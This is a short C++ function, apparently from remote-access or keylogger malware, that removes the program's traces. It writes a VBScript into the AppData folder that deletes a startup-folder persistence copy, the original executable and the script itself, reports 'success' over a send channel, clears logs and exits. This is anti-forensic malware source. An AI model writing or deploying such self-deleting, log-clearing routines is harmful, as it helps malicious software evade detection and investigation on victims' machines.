void DeleteSelf()
{
	std::string location = appdata + "\\del.vbs";
	std::ofstream vbsFile(location);

	command = "start " + location;
	fileName = firstPath;

	vbsFile << "WScript.Sleep(1000)\n";
	if (startup) {
		vbsFile << "Set f1 = CreateObject(\"Scripting.FileSystemObject\"):f1.DeleteFile \"" + startupPath + "\", True\n";
	}
	vbsFile <<
		"Set f2 = CreateObject(\"Scripting.FileSystemObject\"):f2.DeleteFile \"" + fileName + "\", True\n"
		"Set f3 = CreateObject(\"Scripting.FileSystemObject\"):f3.DeleteFile \"" + location + "\", True\n";

	vbsFile.close();

	send("success");
	ClearLogs();
	system(command.data());
	exit(0);
}